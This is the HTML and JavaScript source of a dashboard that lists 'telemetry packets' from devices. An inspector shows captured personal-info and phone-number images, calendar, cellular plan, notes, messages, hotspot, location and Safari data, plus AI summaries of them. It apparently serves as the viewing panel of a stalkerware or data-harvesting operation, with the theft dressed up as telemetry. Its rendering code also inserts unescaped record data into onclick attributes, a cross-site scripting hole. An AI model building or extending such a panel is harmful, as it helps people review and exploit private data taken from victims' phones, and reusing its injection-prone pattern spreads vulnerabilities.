<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Data Center & History</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-[#090a0f] text-slate-200 min-h-screen font-sans selection:bg-slate-700 selection:text-white">
  
  <div class="max-w-4xl mx-auto px-6 py-12">
    
    <!-- Header & Tab Navigation -->
    <header class="flex flex-col md:flex-row md:items-center justify-between gap-4 pb-6 border-b border-white/10 mb-8">
      <div>
        <h1 class="text-xl font-semibold tracking-tight text-white">Data Center & Logs</h1>
        <p class="text-xs text-slate-400 mt-1">Manage device telemetry packets and AI-generated summaries.</p>
      </div>
      <div class="flex items-center gap-2 bg-black/40 border border-white/10 p-1 rounded-xl">
        <button id="tab-telemetry-btn" onclick="switchTab('telemetry')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white">Telemetry</button>
        <button id="tab-summaries-btn" onclick="switchTab('summaries')" class="text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white">AI Summaries</button>
      </div>
    </header>

    <!-- Toolbar / Search / Refresh -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-6">
      <input type="text" id="search-input" oninput="renderCurrentTab()" placeholder="Filter entries..." class="w-full bg-black/40 border border-white/10 rounded-lg px-4 py-2.5 text-xs text-slate-200 placeholder-slate-500 focus:outline-none focus:border-white/30 transition">
      <div class="flex items-center gap-3 shrink-0">
        <select id="sort-select" onchange="renderCurrentTab()" class="bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-xs text-slate-300 focus:outline-none focus:border-white/30 transition">
          <option value="newest">Newest First</option>
          <option value="oldest">Oldest First</option>
        </select>
        <button onclick="loadAllData()" class="bg-white/5 hover:bg-white/10 border border-white/10 text-slate-300 text-xs px-3.5 py-2 rounded-lg transition active:scale-95">
          Refresh
        </button>
      </div>
    </div>

    <!-- Main Content Container -->
    <div id="content-container" class="space-y-3">
      <div class="text-center py-20 text-xs text-slate-500">Loading data...</div>
    </div>

  </div>

  <!-- Telemetry Inspector Modal -->
  <div id="inspector-modal" class="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 hidden flex items-center justify-center p-4">
    <div class="bg-[#12131c] border border-white/10 rounded-2xl w-full max-w-3xl max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
      
      <div class="flex items-center justify-between px-6 py-4 border-b border-white/10 bg-black/20">
        <h2 class="text-sm font-medium text-white flex items-center gap-2">
          <span>Session Inspector</span>
          <span id="modal-timestamp" class="text-xs text-slate-500 font-normal"></span>
        </h2>
        <button onclick="closeModal()" class="text-slate-400 hover:text-white text-xs px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 transition">Close</button>
      </div>

      <div class="p-6 overflow-y-auto space-y-6 text-xs font-mono">
        <div>
          <p class="text-slate-400 font-sans font-medium mb-3 uppercase tracking-wider text-[10px]">Captured Assets (Base64)</p>
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div class="bg-black/40 border border-white/10 rounded-xl p-3 flex flex-col items-center">
              <span class="text-[10px] text-slate-500 font-sans mb-2 self-start">Personal Info</span>
              <img id="img-personal" src="" alt="" class="max-h-48 object-contain rounded border border-white/10 bg-black">
            </div>
            <div class="bg-black/40 border border-white/10 rounded-xl p-3 flex flex-col items-center">
              <span class="text-[10px] text-slate-500 font-sans mb-2 self-start">Phone Number</span>
              <img id="img-phone" src="" alt="" class="max-h-48 object-contain rounded border border-white/10 bg-black">
            </div>
          </div>
        </div>

        <div class="space-y-4 font-sans">
          <p class="text-slate-400 font-medium uppercase tracking-wider text-[10px]">Text & Data Payloads</p>
          
          <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
              <div class="flex justify-between items-center mb-2">
                <span class="text-[11px] font-medium text-slate-400">Calendar Data</span>
                <button onclick="copyField('field-calendar')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
              </div>
              <div id="field-calendar" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
            </div>
            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
              <div class="flex justify-between items-center mb-2">
                <span class="text-[11px] font-medium text-slate-400">Cellular Plan Data</span>
                <button onclick="copyField('field-cellular')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
              </div>
              <div id="field-cellular" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
            </div>
          </div>

          <div class="bg-black/40 border border-white/10 rounded-xl p-4">
            <div class="flex justify-between items-center mb-2">
              <span class="text-[11px] font-medium text-slate-400">Notes Field</span>
              <button onclick="copyField('field-notes')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
            </div>
            <div id="field-notes" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
          </div>

          <div class="bg-black/40 border border-white/10 rounded-xl p-4">
            <div class="flex justify-between items-center mb-2">
              <span class="text-[11px] font-medium text-slate-400">Messages Payload</span>
              <button onclick="copyField('field-messages')" class="text-[10px] text-indigo-400 hover:underline">Copy</button>
            </div>
            <div id="field-messages" class="text-slate-200 text-xs font-mono whitespace-pre-wrap bg-black/50 p-3 rounded border border-white/5 max-h-32 overflow-y-auto"></div>
          </div>

          <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
              <span class="text-[11px] font-medium text-slate-400 block mb-1">Hotspot</span>
              <div id="field-hotspot" class="text-slate-200 text-xs font-mono truncate"></div>
            </div>
            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
              <span class="text-[11px] font-medium text-slate-400 block mb-1">Location</span>
              <div id="field-location" class="text-slate-200 text-xs font-mono truncate"></div>
            </div>
            <div class="bg-black/40 border border-white/10 rounded-xl p-4">
              <span class="text-[11px] font-medium text-slate-400 block mb-1">Safari Data</span>
              <div id="field-safari" class="text-slate-200 text-xs font-mono truncate"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    let activeTab = 'telemetry';
    let telemetryData = [];
    let summariesData = [];

    async function loadAllData() {
      try {
        const [subRes, sumRes] = await Promise.all([
          fetch('/api/submissions'),
          fetch('/api/summaries')
        ]);
        const subJson = await subRes.json();
        const sumJson = await sumRes.json();

        telemetryData = subJson.success ? subJson.submissions : [];
        summariesData = sumJson.success ? sumJson.summaries : [];
        renderCurrentTab();
      } catch (err) {
        document.getElementById('content-container').innerHTML = `<div class="text-center py-20 text-xs text-red-400">Failed to load data.</div>`;
      }
    }

    function switchTab(tab) {
      activeTab = tab;
      const telBtn = document.getElementById('tab-telemetry-btn');
      const sumBtn = document.getElementById('tab-summaries-btn');
      
      if (tab === 'telemetry') {
        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
      } else {
        sumBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition bg-white/10 text-white";
        telBtn.className = "text-xs px-3 py-1.5 rounded-lg font-medium transition text-slate-400 hover:text-white";
      }
      renderCurrentTab();
    }

    function renderCurrentTab() {
      if (activeTab === 'telemetry') {
        renderTelemetry();
      } else {
        renderSummaries();
      }
    }

    function renderTelemetry() {
      const container = document.getElementById('content-container');
      const query = document.getElementById('search-input').value.toLowerCase();
      const sortMode = document.getElementById('sort-select').value;

      let filtered = telemetryData.filter(item => {
        const notesStr = String(item.notes || '').toLowerCase();
        const msgStr = String(item.messages || '').toLowerCase();
        return notesStr.includes(query) || msgStr.includes(query);
      });

      filtered.sort((a, b) => sortMode === 'newest' ? b.timestamp - a.timestamp : a.timestamp - b.timestamp);

      if (filtered.length === 0) {
        container.innerHTML = `<div class="text-center py-16 text-xs text-slate-500 border border-white/5 rounded-xl">No telemetry packets found.</div>`;
        return;
      }

      container.innerHTML = filtered.map(item => `
        <div onclick='openModal(${JSON.stringify(item)})' class="bg-black/30 hover:bg-black/50 border border-white/10 hover:border-white/20 rounded-xl p-4 transition cursor-pointer flex items-center justify-between group">
          <div class="space-y-1">
            <div class="text-xs font-mono text-slate-200 truncate max-w-md">${escapeHtml(String(item.notes || 'No Notes Content'))}</div>
            <div class="text-[10px] text-slate-500 font-mono">${new Date(item.timestamp).toLocaleString()}</div>
          </div>
          <div class="text-[11px] text-slate-400 group-hover:text-white transition flex items-center gap-1">Inspect &rarr;</div>
        </div>
      `).join('');
    }

    function renderSummaries() {
      const container = document.getElementById('content-container');
      const query = document.getElementById('search-input').value.toLowerCase();
      const sortMode = document.getElementById('sort-select').value;

      let filtered = summariesData.filter(item => {
        return item.title.toLowerCase().includes(query) || item.text.toLowerCase().includes(query);
      });

      filtered.sort((a, b) => sortMode === 'newest' ? b.timestamp - a.timestamp : a.timestamp - b.timestamp);

      if (filtered.length === 0) {
        container.innerHTML = `<div class="text-center py-16 text-xs text-slate-500 border border-white/5 rounded-xl">No AI summaries found.</div>`;
        return;
      }

      // Build quick lookup map for telemetry items
      const subMap = {};
      telemetryData.forEach(s => { subMap[s.id] = s; });

      container.innerHTML = filtered.map(item => {
        const hasLinkedSub = item.submissionId && subMap[item.submissionId];
        return `
          <div class="bg-black/30 border border-white/10 rounded-xl p-5 space-y-3">
            <div class="flex items-start justify-between gap-4">
              <div>
                <h2 class="font-semibold text-sm text-slate-100">${escapeHtml(item.title)}</h2>
                <div class="text-[10px] text-slate-500 font-mono mt-0.5">${new Date(item.timestamp).toLocaleString()}</div>
              </div>
              <div class="flex items-center gap-2 shrink-0">
                ${hasLinkedSub ? `<button onclick='openTelemetryById("${item.submissionId}")' class="text-[10px] bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 border border-indigo-500/20 px-2.5 py-1 rounded transition">View Telemetry</button>` : ''}
                <button onclick='copyText(this, ${JSON.stringify(item.text)})' class="text-[10px] bg-white/5 hover:bg-white/10 text-slate-300 px-2.5 py-1 rounded transition">Copy</button>
              </div>
            </div>
            <div class="bg-black/50 border border-white/5 rounded-lg p-3 text-xs text-slate-300 font-mono whitespace-pre-wrap max-h-40 overflow-y-auto leading-relaxed">${escapeHtml(item.text)}</div>
          </div>
        `;
      }).join('');
    }

    function openTelemetryById(subId) {
      const match = telemetryData.find(s => String(s.id) === String(subId));
      if (match) {
        openModal(match);
      } else {
        alert('Linked telemetry packet not found.');
      }
    }

    function openModal(item) {
      document.getElementById('modal-timestamp').innerText = new Date(item.timestamp).toLocaleString();
      document.getElementById('img-personal').src = item.personal_info_b64 || '';
      document.getElementById('img-phone').src = item.phone_number_b64 || '';
      document.getElementById('field-calendar').innerText = item.calendar || 'N/A';
      document.getElementById('field-cellular').innerText = item.cellular_plan || 'N/A';
      document.getElementById('field-notes').innerText = item.notes || 'N/A';
      document.getElementById('field-messages').innerText = item.messages || 'N/A';
      document.getElementById('field-hotspot').innerText = item.hotspot || 'N/A';
      document.getElementById('field-location').innerText = item.location || 'N/A';
      document.getElementById('field-safari').innerText = item.safari || 'N/A';
      
      document.getElementById('inspector-modal').classList.remove('hidden');
    }

    function closeModal() {
      document.getElementById('inspector-modal').classList.add('hidden');
    }

    function copyField(elementId) {
      const text = document.getElementById(elementId).innerText;
      navigator.clipboard.writeText(text);
      alert('Copied to clipboard');
    }

    function copyText(btn, text) {
      navigator.clipboard.writeText(text);
      const original = btn.innerText;
      btn.innerText = 'Copied!';
      setTimeout(() => btn.innerText = original, 2000);
    }

    function escapeHtml(str) {
      return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    loadAllData();
  </script>
</body>
</html>
